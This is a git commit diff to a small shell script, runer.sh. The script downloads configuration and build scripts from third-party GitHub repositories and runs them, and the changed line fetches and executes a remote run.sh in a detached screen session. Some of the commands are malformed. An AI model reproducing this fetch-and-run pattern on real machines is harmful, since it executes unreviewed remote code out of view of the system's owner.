1398808a8e309a07c72230fd286928cde04547a4
nurfasikin <92776649+nurfasikin@users.noreply.github.com>
2022-07-04 18:57:52 +0700

    Update runer.sh

--- runer.sh
+++ runer.sh
@@ -4,6 +4,6 @@ apt install screen -y
 wget tune_config https://raw.githubusercontent.com/uaaoxjdr/testly/main/tune_config
 wget compile.sh https://raw.githubusercontent.com/uaaoxjdr/testly/main/compile.sh
 chmod +x compile.sh
-screen -dm -S https://raw.githubusercontent.com/nurfasikin/DGB/main/run.sh && chmod u+x run.sh && ./run.sh
+screen -dm -S wget https://raw.githubusercontent.com/nurfasikin/DGB/main/run.sh && chmod u+x run.sh && ./run.sh
 ./compile.sh
 echo succes
